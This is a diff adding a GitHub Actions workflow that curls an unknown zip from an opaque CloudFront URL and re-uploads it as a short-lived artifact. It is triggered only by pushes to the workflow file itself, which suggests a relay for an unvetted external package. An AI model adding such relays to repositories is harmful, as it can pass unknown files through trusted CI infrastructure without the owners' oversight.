@@ -1,0 +1,17 @@
+name: ClipNerve recovery relay
+on:
+  push:
+    paths:
+      - '.github/workflows/clipnerve-recovery-relay.yml'
+jobs:
+  relay:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fetch recovery package
+        run: curl -fL --retry 3 -o relay.zip 'https://d2ol7oe51mr4n9.cloudfront.net/user_3JzZORlH5hOIMtVqoR4LoNCKTLC/f437d7c9-c3aa-478c-b934-256ee0136e4c.zip'
+      - name: Upload recovery artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: clipnerve-recovery-package
+          path: relay.zip
+          retention-days: 1
